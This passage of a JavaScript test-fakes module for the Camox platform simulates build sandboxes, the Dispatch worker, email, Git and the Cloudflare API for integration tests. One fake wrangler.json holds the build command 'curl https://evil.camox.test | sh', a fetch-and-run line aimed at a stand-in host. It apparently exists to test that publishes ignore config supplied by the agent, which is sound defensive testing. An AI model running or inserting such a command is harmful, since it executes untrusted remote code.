    if (BUILD_COMMAND.test(command) && !releases(options.env)) return result(1, UNAUTHENTICATED);
    if (LINT_COMMAND.test(command) && !releases(options.env)) {
      return result(1, "", `Failed to parse oxlint configuration file.\n${UNAUTHENTICATED}`);
    }
    if (BUILD_COMMAND.test(command)) {
      // Builds sharing the sandbox's one workspace at once would build each other's files.
      const at = buildsAtOnce.get(this.name) ?? { running: 0, most: 0 };
      at.running += 1;
      at.most = Math.max(at.most, at.running);
      buildsAtOnce.set(this.name, at);
      try {
        // Polled: a promise resolved from the request letting go wouldn't wake this one.
        while (heldBuilds.has(this.name)) await new Promise((resolve) => setTimeout(resolve, 10));
      } finally {
        at.running -= 1;
      }
      const failing = failingBuilds.find(({ marker }) =>
        Object.values(this.tree).some((content) => content.includes(marker)),
      );
      const builds = revisionBuilds.get(this.name) ?? [];
      builds.push({ sandbox: this.name, files: this.tree, archive: null });
      revisionBuilds.set(this.name, builds);
      this.sdkBundle = null;
      if (this.#buildsAgainstSdkBundle()) {
        // As a hosted build with the switch on: it names its bundle from the workspace's
        // lockfile and fails before bundling, whatever its code, unless the bundle's cache
        // holds both targets.
        const lockfile = this.tree["pnpm-lock.yaml"] ?? "";
        const names = {
          browser: await sdkBundleName({ lockfile, target: "browser", settings: HOSTED_SETTINGS }),
          workerd: await sdkBundleName({ lockfile, target: "workerd", settings: HOSTED_SETTINGS }),
        };
        const cache = options.env?.CAMOX_INTERNAL_SDK_BUNDLE_CACHE;
        const cached = Object.values(names).every(
          (name) => cache && this.files.has(`${cache}/${name}/sdk-bundle.json`),
        );
        if (!cached) {
          this.built = false;
          return result(
            1,
            `error during build:\nSdkBundleMissingError: The SDK Bundle isn't in its cache.\n${sdkBundleMissingLine(names)}\n`,
          );
        }
        this.sdkBundle = names;
      }
      this.built = !failing;
      return failing ? result(1, failing.log) : result(0);
    }
    const typeCheck = TYPE_CHECK_COMMAND.exec(command);
    if (typeCheck) {
      while (heldTypeChecks.has(this.name)) await new Promise((resolve) => setTimeout(resolve, 10));
      const crash = typeCheckCrashes.find(
        ({ marker, times }) =>
          times > 0 && Object.values(this.tree).some((content) => content.includes(marker)),
      );
      if (crash) {
        crash.times -= 1;
        return result(139, "Segmentation fault (core dumped)");
      }
      // It checks the files its config includes, as tsrs reads them.
      const configPath = typeCheck[1].startsWith("/")
        ? typeCheck[1]
        : `${options.cwd ?? ""}/${typeCheck[1]}`;
      const config = this.files.get(configPath);
      if (!config) {
        return result(1, `error TS5058: The specified path does not exist: '${typeCheck[1]}'.`);
      }
      const { include = [] } = JSON.parse(new TextDecoder().decode(config));
      const checked = Object.keys(this.tree).filter((path) => included(path, include));
      const reported = failingTypeChecks
        .filter(({ marker }) =>
          Object.values(this.tree).some((content) => content.includes(marker)),
        )
        .flatMap(({ errors }) => errors)
        .filter(({ file }) => checked.includes(file));
      if (reported.length === 0) return result(0);
      return result(2, "", `${reported.map(printedTypeError).join("\n")}\n`);
    }
    if (LINT_COMMAND.test(command)) {
      const diagnostics = lintedTrees
        .filter(({ marker }) =>
          Object.values(this.tree).some((content) => content.includes(marker)),
        )
        .flatMap(({ diagnostics }) => diagnostics);
      // As `vp lint` prints it: the Camox plugin logs as Vite+ loads the config, then the JSON.
      const stdout = `4:00:00 AM [vite+] Building Camox app (Live, not released)
{ "diagnostics": [${diagnostics.map((diagnostic) => JSON.stringify(diagnostic)).join(",\n")}],
              "number_of_files": ${Object.keys(this.tree).length},
              "number_of_rules": 127,
              "threads_count": 4,
              "start_time": 0.25
            }
`;
      const errors = diagnostics.some(({ severity }) => severity === "error");
      return result(errors ? 1 : 0, "", stdout);
    }
    const archive = ARCHIVE_COMMAND.exec(command);
    if (archive) {
      if (!this.built) return result(2, "tar: dist: Cannot stat: No such file or directory");
      const build = `fake build of ${await treeOf(this.tree)}`;
      const bytes = await fakeBuildArchive(build, this.tree, this.sdkBundle);
      this.files.set(archive[1], bytes);
      Object.assign(revisionBuilds.get(this.name).at(-1), { archive: [...bytes], build });
      // As `cat dist/*/camox-sdk-bundle.json` prints it, when the command reads it.
      const manifest =
        command.includes(SDK_BUNDLE_BUILD_MANIFEST) && this.sdkBundle
          ? JSON.stringify(this.sdkBundle)
          : "";
      return result(0, "", manifest);
    }
    const unpack = SDK_BUNDLE_UNPACK_COMMAND.exec(command);
    if (unpack) {
      const archived = this.files.get(unpack[1]);
      if (!archived) return result(2, `tar: ${unpack[1]}: Cannot open: No such file or directory`);
      if ([...this.files.keys()].some((path) => path.startsWith(`${unpack[3]}/`))) {
        return result(1, `mv: cannot move '${unpack[2]}' to '${unpack[3]}': Directory not empty`);
      }
      for (const [path, content] of await unpackedSdkBundle(archived)) {
        this.files.set(`${unpack[3]}/${path}`, content);
      }
      this.files.delete(unpack[1]);
      return result(0);
    }
    return result(0);
  }

  /**
   * A process started in the background, as the revision builder is, recorded among the
   * sandbox's commands. It runs nothing: builds run as their command does.
   * @param {string} command
   * @param {{ env?: Record<string, string>, cwd?: string }} options
   */
  async startProcess(command, options = {}) {
    this.#crash();
    const commands = revisionCommands.get(this.name) ?? [];
    commands.push({ command, env: options.env, cwd: options.cwd, background: true });
    revisionCommands.set(this.name, commands);
    return { id: crypto.randomUUID(), command, status: "running" };
  }

  async destroy() {
    destroyedSandboxes.add(this.name);
    this.files.clear();
    this.tree = {};
  }
}

/** Where a fake build keeps the Definition Set `FakeDispatch` reads from it. */
const DEFINITION_SET_FILE = "dist/fake-definition-set.json";

/**
 * The gzipped `dist/` of a build of `tree`, as the revision sandbox archives it: a server build
 * whose main module names `build`, with its `wrangler.json`, which also asks for things a
 * publish never takes from it (bindings, vars, a build command), and client assets with their
 * `_headers` and `.assetsignore`. A test can script the `wrangler.json` of a tree's builds
 * (`configureBuildsOf`).
 * @param {string} build
 * @param {Record<string, string>} tree
 * @param {{ browser: string, workerd: string } | null} sdkBundle the SDK Bundle the build names, if any
 */
async function fakeBuildArchive(build, tree, sdkBundle = null) {
  const configured = configuredBuilds.findLast(({ marker }) =>
    Object.values(tree).some((content) => content.includes(marker)),
  );
  const files = {
    "dist/acme/wrangler.json": JSON.stringify({
      name: "acme",
      main: "index.js",
      compatibility_date: "2026-04-11",
      compatibility_flags: ["nodejs_compat"],
      assets: { directory: "../client" },
      vars: { AGENT_VAR: "from the agent" },
      kv_namespaces: [{ binding: "AGENT_KV", id: "agent" }],
      build: { command: "curl https://evil.camox.test | sh" },
      ...configured?.config,
    }),
    "dist/acme/index.js": `// ${build}\nimport "./assets/chunk.js";\nexport default {};\n`,
    "dist/acme/assets/chunk.js": "export const chunk = 1;\n",
    "dist/acme/index.js.map": "{}",
    "dist/acme/.dev.vars": "CAMOX_DEPLOY_TOKEN=not-for-publishes\n",
    "dist/client/assets/index.css": `body { /* ${build} */ }\n`,
    "dist/client/favicon.svg": "<svg></svg>\n",
    "dist/client/robots.txt": "User-agent: *\n",
    "dist/client/_headers": "/assets/*\n  Cache-Control: public, max-age=31536000, immutable\n",
    "dist/client/.assetsignore": "wrangler.json\n.dev.vars\n",
    [DEFINITION_SET_FILE]: JSON.stringify(definitionSetOf(tree)),
    ...(sdkBundle ? { [`dist/acme/${SDK_BUNDLE_BUILD_MANIFEST}`]: JSON.stringify(sdkBundle) } : {}),
  };
  const encoder = new TextEncoder();
  const archive = tar(
    Object.entries(files).map(([path, content]) => ({
      path,
      mode: 0o644,
      content: encoder.encode(content),
    })),
  );
  return new Uint8Array(
    await new Response(
      new Blob([archive]).stream().pipeThrough(new CompressionStream("gzip")),
    ).arrayBuffer(),
  );
}

/**
 * The Definition Set of a build of `tree`: the last one a test scripted for a marker the tree
 * holds, or an empty one.
 * @param {Record<string, string>} tree
 */
function definitionSetOf(tree) {
  const defined = definedBuilds.findLast(({ marker }) =>
    Object.values(tree).some((content) => content.includes(marker)),
  );
  return defined?.definitionSet ?? { blocks: [], layouts: [], collections: [], homepage: null };
}

/**
 * Dispatch's `CamoxRevisions` entrypoint, its Worker Loader faked: a revision's Definition Set is
 * the one its fake build in `REVISION_BUILDS` carries.
 */
export class FakeDispatch extends WorkerEntrypoint {
  /** @param {{ revision: string, archiveKey: string, project: string, draft: string }} revision */
  async readDefinitionSet({ archiveKey }) {
    const archive = await this.env.REVISION_BUILDS.get(archiveKey);
    if (!archive) throw new Error(`The build ${archiveKey} isn't stored`);
    const files = await untarGzip(archive.body);
    return JSON.parse(new TextDecoder().decode(files.get(DEFINITION_SET_FILE)));
  }

  /**
   * Prepares a revision from `archive`, the build the API sends, or else from its build in
   * `REVISION_BUILDS`.
   * @param {{ revision: string, archiveKey: string, project: string, draft: string }} revision
   * @param {Uint8Array} [archive]
   */
  async prepare(revision, archive) {
    const failures = prewarmFailures.get(revision.project) ?? 0;
    if (failures > 0) {
      prewarmFailures.set(revision.project, failures - 1);
      throw new Error("Network connection lost.");
    }
    const definitionSet = archive
      ? JSON.parse(
          new TextDecoder().decode(
            (await untarGzip(new Response(archive).body)).get(DEFINITION_SET_FILE),
          ),
        )
      : await this.readDefinitionSet(revision);
    // Dispatch stores the revision's client assets where its asset prefix serves them from.
    await this.env.REVISION_BUILDS.put(
      `${revision.project}/revisions/${revision.revision}/#assets`,
      "body {}",
    );
    prewarmed.push(revision);
    return { definitionSet, assets: 1, readMs: 0, assetsMs: 0, definitionSetMs: 0, renderMs: 0 };
  }
}

/** The `send_email` binding: records each email instead of sending it. */
export class FakeEmail extends WorkerEntrypoint {
  /** @param {{ from: unknown, to: string, subject: string, text: string, html: string }} message */
  async send(message) {
    const { from, to, subject, text, html } = message;
    if (failingEmails.some((pattern) => text.includes(pattern))) {
      throw new Error("Email sending is down");
    }
    emailsSent.push({ from, to, subject, text, html });
    return { messageId: crypto.randomUUID() };
  }
}

/** What the tests use to arrange a push and read what the sandbox ran. */
export class ReleaseFakes extends WorkerEntrypoint {
  /**
   * Pushes a commit to the repo's `main`, creating the repo if needed, and returns its tree.
   * @param {string} repo
   * @param {string} commit
   * @param {Record<string, string>} files
   */
  async push(repo, commit, files) {
    const commits = repos.get(repo) ?? new Map();
    commits.set(commit, files);
    repos.set(repo, commits);
    mains.set(repo, commit);
    return treeOf(files);
  }

  /**
   * Makes the next `times` runs of a command containing `pattern` exit non-zero.
   * @param {string} repo
   * @param {string} pattern
   * @param {number} times
   */
  async failCommand(repo, pattern, times) {
    failures.set(repo, [...(failures.get(repo) ?? []), { pattern, times }]);
  }

  /**
   * Lets runs of a command containing `pattern` pass again, ending `failCommand`'s failures.
   * @param {string} repo
   * @param {string} pattern
   */
  async passCommand(repo, pattern) {
    failures.set(
      repo,
      (failures.get(repo) ?? []).filter((failure) => failure.pattern !== pattern),
    );
  }

  /**
   * Makes runs of a command containing `pattern` wait to exit until `letGo` is called.
   * @param {string} repo
   * @param {string} pattern
   */
  async hold(repo, pattern) {
    held.set(repo, pattern);
  }

  /** @param {string} repo */
  async letGo(repo) {
    held.delete(repo);
  }

  /**
   * Makes `pnpm install` in the repo's upgrade write `lockfile`, as resolving the new SDK would.
   * @param {string} repo
   * @param {string} lockfile
   */
  async installResolves(repo, lockfile) {
    installsResolving.set(repo, lockfile);
  }

  /**
   * Makes the website's camox build every tree with a file holding `marker` against an SDK
   * Bundle, as with the switch on (#674): it names its bundle, which must be in its cache.
   * @param {string} marker
   */
  async buildAgainstSdkBundlesOf(marker) {
    sdkBundleSwitchedOn.push(marker);
  }

  /** Every SDK Bundle's build, in the order they started, without what it built. */
  async sdkBundleBuilds() {
    return sdkBundleBuilds.map(({ names: _names, ...build }) => build);
  }

  /**
   * Makes the SDK Bundle builds whose lockfile contains `marker` wait until they're let go.
   * @param {string} marker
   */
  async holdSdkBundleBuildsOf(marker) {
    heldSdkBundleMarkers.push(marker);
  }

  /**
   * Makes the SDK Bundle builds whose lockfile contains `marker` report, and archive under,
   * `names` instead of their own, as a lockfile pointing at a forked camox could.
   * @param {string} marker
   * @param {Record<string, string>} names
   */
  async forgeSdkBundleNamesOf(marker, names) {
    forgedSdkBundleNames.push({ marker, names });
  }

  /** @param {string} sandbox Lets the held SDK Bundle build in `sandbox` finish. */
  async letGoSdkBundleBuild(sandbox) {
    letGoSdkBundleSandboxes.add(sandbox);
  }

  /** @param {string} repo */
  async commandsRun(repo) {
    return commandsRun.get(repo) ?? [];
  }

  /**
   * Makes every send of an email whose text contains `pattern` throw.
   * @param {string} pattern
   */
  async failEmailsAbout(pattern) {
    failingEmails.push(pattern);
  }

  /** Every email sent through the fake `send_email` binding, in order. */
  async emailsSent() {
    return emailsSent;
  }

  /**
   * Commits `files` as the whole of a Git repo's `main`, such as `template-default`'s.
   * @param {string} repo
   * @param {Record<string, import("./fake-git-server").FakeFile>} files
   * @param {string} message
   */
  async commit(repo, files, message) {
    return commitFiles(repo, files, message);
  }

  /**
   * A file on a Git repo's branch or commit, or null.
   * @param {string} repo
   * @param {string} ref
   * @param {string} path
   */
  async readFile(repo, ref, path) {
    return readGitFile(repo, ref, path);
  }

  /**
   * Where a symlink on a Git repo's branch or commit points, or null when it isn't one.
   * @param {string} repo
   * @param {string} ref
   * @param {string} path
   */
  async readLink(repo, ref, path) {
    return readGitLink(repo, ref, path);
  }

  /**
   * The events of a Git repo's pushes to `main` since the last call, oldest first, as Cloudflare
   * Artifacts sends them.
   * @param {string} repo
   */
  async takePushEvents(repo) {
    return takePushEvents(repo);
  }

  /** @param {string} repo The branches of a Git repo, `main` first. */
  async branches(repo) {
    return gitBranches(repo);
  }

  /** @param {string} repo The commits on a Git repo's `main`, newest first. */
  async log(repo) {
    return gitLog(repo);
  }

  /** @param {string} repo Makes the next fork into `repo` land but throw. */
  async loseForkResponse(repo) {
    lostForkResponses.add(repo);
  }

  /** @param {string} repo Makes every fork into `repo` fail. */
  async failForks(repo) {
    failingForks.add(repo);
  }

  /** @param {string} repo Makes the next push to `repo` land but answer with an error. */
  async losePushResponse(repo) {
    losePushResponse(repo);
  }

  /**
   * Makes the next `times` pushes to the branch `branch` of `repo` fail without landing: `*`
   * names every branch but `main`.
   * @param {string} repo
   * @param {string} branch
   * @param {number} times
   */
  async failPushes(repo, branch, times) {
    failPushes(repo, branch, times);
  }

  /**
   * Holds every push to the branch `branch` of `repo` until `letGoPushes`.
   * @param {string} repo
   * @param {string} branch
   */
  async holdPushes(repo, branch) {
    holdPushes(repo, branch);
  }

  /**
   * @param {string} repo
   * @param {string} branch
   */
  async letGoPushes(repo, branch) {
    letGoPushes(repo, branch);
  }

  /** @param {string} repo How many pushes to `repo` wait on a hold now. */
  async pushesWaiting(repo) {
    return pushesWaiting(repo);
  }

  /** @param {string} repo Whether a Git repo or a pushed repo of that name exists. */
  async hasRepo(repo) {
    return hasGitRepo(repo) || repos.has(repo);
  }

  /** @param {string} sandbox The builds a revision sandbox ran, oldest first. */
  async revisionBuilds(sandbox) {
    return revisionBuilds.get(sandbox) ?? [];
  }

  /**
   * @param {string} sandbox The commands a revision sandbox ran, oldest first, with the processes
   * it started in the background (`background`).
   */
  async revisionCommands(sandbox) {
    return revisionCommands.get(sandbox) ?? [];
  }

  /**
   * Makes every build of a tree with a file containing `marker` fail, with `log` as its output.
   * @param {string} marker
   * @param {string} log
   */
  async failBuildsOf(marker, log) {
    failingBuilds.push({ marker, log });
  }

  /**
   * Makes every type check of a tree with a file containing `marker` report those of `errors`
   * in the files it checks.
   * @param {string} marker
   * @param {FakeTypeError[]} errors
   */
  async failTypeChecksOf(marker, errors) {
    failingTypeChecks.push({ marker, errors });
  }

  /**
   * Holds every type check of a revision sandbox from now on, as a check still running, until
   * `releaseTypeChecks(sandbox)`.
   * @param {string} sandbox
   */
  async holdTypeChecks(sandbox) {
    heldTypeChecks.add(sandbox);
  }

  /** @param {string} sandbox Lets go of the sandbox's type checks `holdTypeChecks()` holds. */
  async releaseTypeChecks(sandbox) {
    heldTypeChecks.delete(sandbox);
  }

  /**
   * Makes every lint of a tree with a file containing `marker` find `diagnostics`, as
   * `vp lint --format json` prints them.
   * @param {string} marker
   * @param {unknown[]} diagnostics
   */
  async lintFindingsOf(marker, diagnostics) {
    lintedTrees.push({ marker, diagnostics });
  }

  /**
   * Holds every build of a revision sandbox from now on, as a build still running, until
   * `releaseBuilds(sandbox)`.
   * @param {string} sandbox
   */
  async holdBuilds(sandbox) {
    heldBuilds.add(sandbox);
  }

  /** @param {string} sandbox The most builds that ran at once in a revision sandbox. */
  async mostBuildsAtOnce(sandbox) {
    return buildsAtOnce.get(sandbox)?.most ?? 0;
  }

  /** @param {string} sandbox Lets go of the sandbox's builds `holdBuilds()` holds. */
  async releaseBuilds(sandbox) {
    heldBuilds.delete(sandbox);
  }

  /**
   * Makes every passing build of a tree with a file containing `marker` have `definitionSet` as
   * its Definition Set.
   * @param {string} marker
   * @param {unknown} definitionSet
   */
  async defineBuildsOf(marker, definitionSet) {
    definedBuilds.push({ marker, definitionSet });
  }

  /** The revisions dispatch prewarmed, oldest first. */
  async prewarmed() {
    return prewarmed;
  }

  /**
   * Makes the next `times` prewarms of the project's revisions fail.
   * @param {string} project the Project ID
   * @param {number} times
   */
  async failPrewarms(project, times) {
    prewarmFailures.set(project, times);
  }

  /**
   * Makes the next `times` calls fail to a revision sandbox building a tree with a file holding
   * `marker`.
   * @param {string} marker
   * @param {number} times
   */
  async crashSandboxes(marker, times) {
    sandboxCrashes.push({ marker, times });
  }

  /**
   * Makes the next `times` type checks of a tree with a file holding `marker` crash.
   * @param {string} marker
   * @param {number} times
   */
  async crashTypeChecks(marker, times) {
    typeCheckCrashes.push({ marker, times });
  }

  /** @param {string} sandbox Whether a revision sandbox was destroyed. */
  async sandboxDestroyed(sandbox) {
    return destroyedSandboxes.has(sandbox);
  }

  /** @param {string} sandbox How long a revision sandbox was told to stay up idle. */
  async sandboxSleepAfter(sandbox) {
    return sandboxSleepAfter.get(sandbox);
  }

  /**
   * Gives revision sandboxes started from now on an image holding the install of `lockfile`, as
   * the release sandbox's image holds the Template's, or none with null.
   * @param {string | null} lockfile
   */
  async installInImage(lockfile) {
    if (lockfile === null) {
      imageInstalledLockfile = null;
      return;
    }
    const digest = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(lockfile));
    imageInstalledLockfile = [...new Uint8Array(digest)]
      .map((byte) => byte.toString(16).padStart(2, "0"))
      .join("");
  }

  /** @param {string} name A user Worker of the `production` dispatch namespace, as uploaded. */
  async userWorker(name) {
    return userWorker(name);
  }

  /** @param {string} project The names of the project's user Workers. */
  async userWorkersOf(project) {
    return userWorkersOf(project);
  }

  /** @param {string} project The project's calls to the Cloudflare API, oldest first. */
  async cloudflareCalls(project) {
    return cloudflareCalls(project);
  }

  /**
   * Makes the next `times` calls of a project to the Cloudflare API containing `pattern` fail,
   * before doing anything, or after, as when their answer is lost (`landing`).
   * @param {string} project
   * @param {string} pattern
   * @param {number} times
   * @param {boolean} [landing]
   */
  async failCloudflareCalls(project, pattern, times, landing = false) {
    failCloudflareCalls(project, pattern, times, landing);
  }

  /**
   * Makes a project's calls to the Cloudflare API containing `pattern` wait until
   * `letGoCloudflareCalls`.
   * @param {string} project
   * @param {string} pattern
   */
  async holdCloudflareCalls(project, pattern) {
    holdCloudflareCalls(project, pattern);
  }

  /**
   * @param {string} project
   * @param {string} pattern
   */
  async letGoCloudflareCalls(project, pattern) {
    letGoCloudflareCalls(project, pattern);
  }

  /** @param {string} name Deploys a user Worker into the `production` dispatch namespace. */
  async deployWorker(name, tags = []) {
    deployUserWorker(name, `release of ${name}`, tags);
  }

  /** @param {string} name Whether the `production` dispatch namespace has that user Worker. */
  async hasWorker(name) {
    return userWorker(name) !== null;
  }

  /** @param {string} name Makes every deletion of that user Worker fail. */
  async failWorkerDeletions(name) {
    failDeletionsOf(name);
  }

  /**
   * Gives the builds of a tree with a file holding `marker` a `wrangler.json` with `config` in it.
   * @param {string} marker
   * @param {Record<string, unknown>} config
   */
  async configureBuildsOf(marker, config) {
    configuredBuilds.push({ marker, config });
  }

  /**
   * Sets the families the fake Google Fonts Developer API lists, most popular first: its
   * `webfonts` items, with `axes`, which it only returns with `capability=VF`.
   * @param {Record<string, unknown>[]} families
   */
  async listGoogleFonts(families) {
    googleFonts = families;
  }
}

/** The host of a public website the agent reads in tests (web-tools.integration.test.ts). */
const FAKE_WEB_HOST = "website.camox.test";

/**
 * The fake public website (web-tools.integration.test.ts, upload.integration.test.ts): under
 * `/media/`, a file whose bytes name its path, typed by `?type=`; at `/redirect?to=`, a redirect
 * there; at `/bytes?count=`, that many bytes, streamed with no length; and anywhere else a page,
 * served as Markdown, so reading it needs no Workers AI.
 * @param {Request} request
 */
function serveWebsite(request) {
  const url = new URL(request.url);
  if (url.pathname.startsWith("/media/")) {
    const type = url.searchParams.get("type");
    return new Response(
      new TextEncoder().encode(`bytes of ${url.pathname}`),
      type ? { headers: { "content-type": type } } : {},
    );
  }
  if (url.pathname === "/redirect") {
    return new Response(null, {
      status: 302,
      headers: { location: url.searchParams.get("to") ?? "" },
    });
  }
  if (url.pathname === "/bytes") {
    let left = Number(url.searchParams.get("count"));
    const chunk = new Uint8Array(1024 * 1024);
    return new Response(
      new ReadableStream({
        pull(controller) {
          if (left <= 0) return controller.close();
          controller.enqueue(chunk.slice(0, Math.min(left, chunk.length)));
          left -= chunk.length;
        },
      }),
    );
  }
  return new Response(`# ${url.pathname}\n\nOpening hours: 9am to 5pm.\n`, {
    headers: { "content-type": "text/markdown; charset=utf-8" },
  });
}

/** The Google Fonts Developer API key the API is given in tests (vite.config.ts). */
const GOOGLE_FONTS_API_KEY = "test-google-fonts-key";
/** @type {Record<string, unknown>[]} the families the fake Google Fonts Developer API lists */
let googleFonts = [];

/**
 * The Google Fonts Developer API's family list, as Google answers it: `axes` only with
 * `capability=VF`, in the order `googleFonts` has them, which stands for popularity.
 * @param {Request} request
 */
function serveGoogleFonts(request) {
  const url = new URL(request.url);
  if (url.pathname !== "/webfonts/v1/webfonts") return new Response("Not Found", { status: 404 });
  if (url.searchParams.get("key") !== GOOGLE_FONTS_API_KEY) {
    return Response.json(
      { error: { code: 400, message: "API key not valid.", status: "INVALID_ARGUMENT" } },
      { status: 400 },
    );
  }
  const variable = url.searchParams.getAll("capability").includes("VF");
  const items = googleFonts.map(({ axes, ...family }) => ({
    kind: "webfonts#webfont",
    ...family,
    ...(variable && axes ? { axes } : {}),
  }));
  return Response.json({ kind: "webfonts#webfontList", items });
}

export default {
  /**
   * The outbound fetches of the Workers under test: Git remotes reach the fake Git server, the
   * Cloudflare API its fake, the fake public website its pages, the Google Fonts Developer API
   * its fake, and anything else goes out as it would without the fakes.
   * @param {Request} request
   */
  fetch: (request) => {
    const { hostname } = new URL(request.url);
    if (hostname === FAKE_GIT_HOST) return serveGit(request);
    if (hostname === "api.cloudflare.com") return serveCloudflareApi(request);
    if (hostname === FAKE_WEB_HOST) return serveWebsite(request);
    if (hostname === "www.googleapis.com") return serveGoogleFonts(request);
    return fetch(request);
  },
};
